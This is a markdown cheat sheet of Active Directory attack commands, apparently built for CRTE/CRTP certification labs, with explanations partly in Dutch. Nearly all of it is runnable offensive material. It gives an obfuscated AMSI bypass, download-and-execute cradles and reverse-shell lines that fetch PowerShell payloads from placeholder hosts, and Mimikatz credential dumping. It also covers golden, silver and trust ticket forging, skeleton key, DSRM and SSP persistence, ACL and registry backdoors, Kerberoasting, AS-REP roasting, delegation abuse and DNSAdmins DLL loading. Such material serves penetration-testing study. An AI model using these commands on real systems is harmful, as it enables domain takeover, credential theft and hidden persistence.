# CRTE-Cheatsheet
Currently copied from CRTP-cheatsheet but will add more!

# Summary
* [General](#General)
* [Domain Enumeration](#Domain-Enumeration.md) 
* [Local privilege escalation](#Local-privilege-escalation)
* [Lateral Movement](#Lateral-Movement)
   * [General](#General) 
   * [Mimikatz](#Mimikatz) 
* [Domain Persistence](#Domain-Persistence)
   * [Golden Ticket](#Golden-Ticket) 
   * [Silver Ticket](#Silver-Ticket)
   * [Skeleton Key](#Skeleton-Key)
   * [DSRM](#DSRM)
   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
   * [ACL](#ACL)
      * [AdminSDHolder](#AdminSDHolder)
      * [DCsync](#DCsync)
      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
* [Domain privilege escalation](#Domain-privilege-escalation)
   * [Kerberoast](#Kerberoast) 
   * [AS-REPS Roasting](#AS-REPS-Roasting) 
   * [Set SPN](#Set-SPN) 
   * [Unconstrained Delegation](#Unconstrained-delegation) 
   * [Constrained Delegation](#Constrained-delegation) 
   * [DNS Admins](#DNS-Admins) 
   * [Enterprise Admins](#Enterprise-Admins) 
      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
   * [Crossforest attacks](#Crossforest-attacks)
      * [Trust flow](#Trust-flow) 
      * [Trust abuse SQL](#Trust-abuse-SQL) 
   
# General
#### Access C disk of a computer (check local admin)
```
ls \\<computername>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<naam>"
```

#### Impacket PSexec impacket
If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
```
python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
```

#### AMSI Bypass
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
```

#### Download and execute cradle
```
iex (New-Object Net.WebClient).DownloadString('https://xx.xx.xx.xx/payload.ps1')

$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://xx.xx.xx.xx/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

#PSv3 onwards

iex (iwr 'http://xx.xx.xx.xx/evil.ps1')

$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://xx.xx.xx.xx/evil.ps1',$false);$h.send();iex
$h.responseText

$wr = [System.NET.WebRequest]::Create("http://xx.xx.xx.xx/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

### Add user to local admin and RDP group and enable RDP on firewall
```
net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

# Domain persistence
## Golden ticket
Golden tickets zijn nagemaakte TGT tickets. TGT tickets worden gebruikt om TGS tickets aan te vragen bij de KDC(DC). De kerberos Golden Ticket is een valid TGT omdat deze ondertekend is door het KRBTGT account. Als je de hash van de KRBTGT account kan achterhalen door de hashes te dumpen op de Domain controller en deze hash niet wijzigt is het mogelijk om weer een TGT aan te vragen bij de volgende penetratietest en volledige toegang tot het domein te verkrijgen.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets

#### Dump hashes - Get the krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Make golden ticket
Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
To get the SID use ```Get-DomainSID``` from powerview
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

## Silver ticket
Silver tickets zijn nagemaakte TGS tickets. Omdat de ticket is nagemaakt op de workstation is er geen communicatie met de DC. Eeen silver ticket kan worden aangemaakt met de service account hash of computer account hash.

https://adsecurity.org/?p=2011
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets

#### Make silver ticket for CIFS
Use the hash of the local computer
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Check access (After CIFS silver ticket)
```
ls \\<servername>\c$\
```

#### Make silver ticket for Host
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Schedule and execute a task (After host silver ticket)
```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

#### Make silver ticket for WMI
Execute for WMI /service:HOST /service:RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

## Skeleton key
De skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.

https://pentestlab.blog/2018/04/10/skeleton-key/

#### Create the skeleton key - Requires DA
```
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
```

## DSRM
De Directory Services Restore Mode is een boot option waarin een domain controller kan worden opgestart zodat een administrator reparaties of een recovery kan uitvoeren op de active directory database. Dit wachtwoord wordt ingesteld tijdens het installeren van de domain controller en wordt daarna bijna nooit gewijzigd. Door de login behavior aan te passen van dit lokale account is het mogelijk om remote toegang te verkrijgen via dit account, een account waarvan het wachtwoord bijna nooit wijzigd! Pas op, dit tast de security van de domain controller aan!

#### Dump DSRM password - dumps local users
look for the local administrator password
```
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
```

#### Change login behavior for the local admin on the DC
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```

#### If property already exists
```
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

#### Pass the hash for local admin
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
```

## Custom SSP - Track logons
Het is mogelijk om met een custom Security Support Provider (SSP) alle logons op een computer bij te houden. Een SSP is een DDL. Een SSP is een DLL waarmee een applicatie een geverifieerde verbinding kan verkrijgen. Sommige SSP-pakketten van Microsoft zijn: NTLM, Kerberos, Wdigest, credSSP. 

Mimikatz biedt een aangepaste SSP - mimilib.dll aan. Deze SSP registreert lokale aanmeldingen, serviceaccount- en computeraccountwachtwoorden in platte tekst op de doelserver.

#### Mimilib.dll
Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
```

#### Use mimikatz to inject into lsass
all logons are logged to C:\Windows\System32\kiwissp.log
```
Invoke-Mimikatz -Command ‘”misc:memssp”’
```

## ACL
### AdminSDHolder
De AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence

#### Check if student has replication rights
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Add fullcontrol permissions for a user to the adminSDHolder
```
Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Run SDProp on AD (Force the sync of AdminSDHolder)
```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check if user got generic all against domain admins group
```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```

#### Add user to domain admin group
```
Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
```

or

```
Net group "domain admins" sportless /add /domain
```

#### Abuse resetpassword using powerview_dev
```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
```

### DCsync
Bij een DCSync aanval immiteren we een DC om de wachtwoorden te achterhalen via domain replication. Hiervoor hebben we bepaalde rechten nodig op de domain controller.

https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
https://blog.stealthbits.com/what-is-dcsync-an-introduction/

#### Add full-control rights
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Add rights for DCsync
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```

#### Execute DCSync and dump krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

### SecurityDescriptor - WMI
```
. ./Set-RemoteWMI.ps1
```

#### On a local machine
```
Set-RemoteWMI -Username <username> -Verbose
```

#### On a remote machine without explicit credentials
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
```

#### On a remote machine with explicit credentials
Only root/cimv and nested namespaces
```
Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

#### On remote machine remove permissions
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
```

#### Check WMI permissions
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

### SecurityDescriptor - Powershell Remoting
```
. ./Set-RemotePSRemoting.ps1
```

#### On a local machine
```
Set-RemotePSRemoting -Username <username> -Verbose
```

#### On a remote machine without credentials
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose
```

#### On a remote machine remove permissions
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove
```

### SecurityDescriptor - Remote Registry
Using the DAMP toolkit
```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```

#### Using DAMP with admin privs on remote machine
```
Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
```

#### Retrieve machine account hash from local machine
```
Get-RemoteMachineAccountHash -Computername <computername> -Verbose
```

#### Retrieve local account hash from local machine
```
Get-RemoteLocalAccountHash -Computername <computername> -Verbose
```

#### Retrieve domain cached credentials from local machine
```
Get-RemoteCachedCredential -Computername <computername> -Verbose
```
# Domain Privilege escalation
## Kerberoast
Kerberoasting een technique waarbij de wachtwoorden van service accounts worden gekraakt. Kerberoasting is voornamelijk efficient indien er user accounts als service accounts worden gebruikt. Een TGS ticket kan worden aangevraagd voor deze user, waarbij de TGS versleuteld is met de NTLM hash van de plaintext wachtwoord van de gebruiker. Als de service account een user account is welke zelf is aangemaakt door de beheerder is de kans groter dat deze ticket te kraken is, en dus het wachtwoord wordt achterhaalt voor de service. Deze TGS ticket kan offline gekraakt worden. Voor de aanval word de kerberoas[https://github.com/nidem/kerberoast] repositorie van Nidem gebruikt.
#### Find user accounts used as service accounts
```
. ./GetUserSPNs.ps1
```
```
Get-NetUser -SPN
```
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

#### Reguest a TGS
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
or
```
Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
```

## AS-REPS Roasting
AS-REPS roasting is een technique waarbij het wachtwoord achterhaald kan worden omdat de 'Do not require Kerberos preauthentication property' is aangezet, oftewel kerberos preauthentication staat uit. Een aanvaller kan de eerste stap van authenticatie overslaan en voor deze gebruiker een TGT aanvragen, welke vervolgens offline gekraakt kan worden.
#### Enumerating accounts with kerberos preauth disabled
```
. .\Powerview_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

#### Enumerate permissions for group
Met genoeg rechten(GenericWrite of GenericAll) is het mogelijk om kerberos preauth uit te schakelen.
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Request encrypted AS-REP
```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Enumerate all users with kerberos preauth disabled and request a hash
```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Set SPN
Met genoeg rechten (GenericALL en GenericWrite) is het mogelijk om zelf de Service Principle Name attribute aan een gebruiker toe te voegen. Deze kan dan worden gekraakt met behulp van kerberoasting.

#### Enumerate permissions for group on ACL
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Check if user has SPN
```
. ./Powerview_dev.ps1
Get-DomainUser -Identity <username> | select samaccountname, serviceprincipalname
```

of

```
Get-NetUser | Where-Object {$_.servicePrincipalName}
```

#### Set SPN for the user
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
```

#### Request a TGS
```
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
```

#### Export ticket to disk for offline cracking
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Request TGS hash for offline cracking hashcat
```
Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Unconstrained Delegation
Unconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.

#### Discover domain computers which have unconstrained delegation
Domain Controllers always show up, ignore them
```
 . .\PowerView_dev.ps1
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```

#### Check if any DA tokens are available on the unconstrained machine
Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

## Constrained Delegation
Als je over een account of computer beschikt met de constrained delegation privilege is het mogelijk om je voor te doen als elk andere gebruiker en jezelf te authentiseren naar een service waar de gebruiker mag delegeren.
### Enumerate
#### Enumerate users with contrained delegation enabled
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```
### Constrained delegation User
#### Requesting TGT with kekeo
```
./kekeo.exe
Tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
```

#### Requesting TGS with kekeo
```
Tgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
```

#### Use Mimikatz to inject the TGS ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

### Constrained delegation Computer
#### Requesting TGT with a PC hash
```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
```

#### Requesting TGS
No validation for the SPN specified
```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```

#### Using mimikatz to inject TGS ticket and executing DCsync
```
Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
```

## DNS Admins
Indien je over een gebruiker bezit die lid is van de 'DNS admin' is het mogelijk om verschillende aanvallen uit te voeren op de DNS server (Meestal Domain Controller) Het is mogelijk om hier een reverse shell mee te krijgen, maar dit legt heel het DNS verkeer plat binnen het domein aangezien dit de DNS service bezighoudt! Voor meer informatie zie [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]
#### Enumerate member of the DNS admin group
```
Get-NetGRoupMember “DNSAdmins”
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```

## Enterprise Admins
### Child to parent - trust tickets
#### Dump trust keys
Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
```

#### Create an inter-realm TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<forest dc name>
```

#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
```
./kirbikator.exe lsa .\<kirbi file>
```

#### Check access to server
```
ls \\<servername>\c$ 
```

### Child to parent - krbtgt hash
#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Create TGT
the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
```

#### Inject the ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
```

#### Get SID of enterprise admin
```
Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
```

## Crossforest attacks
### Trust flow
#### Dump trust keys
Look for in trust key from child to parent (first command)
Look for NTLM hash (second command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
```

#### Create a TGS for a service (kekeo_old)
```
./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
```

#### Use the TGT
```
./kirbikator.exe lsa <kirbi file>
```

#### Check access to server
```
ls \\<servername>\<share>\
```

### Trust abuse SQL
```
. .\PowerUpSQL.ps1
```

#### Discovery SPN scanning
```
Get-SQLInstanceDomain
```

#### Check accessibility
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
```

#### Gather information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

#### Search for links to remote servers
```
Get-SQLServerLink -Instance <sql instance> -Verbose
```

#### Enumerate database links
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
```

#### Enable xp_cmdshell
```
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
```

#### Execute commands
```
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
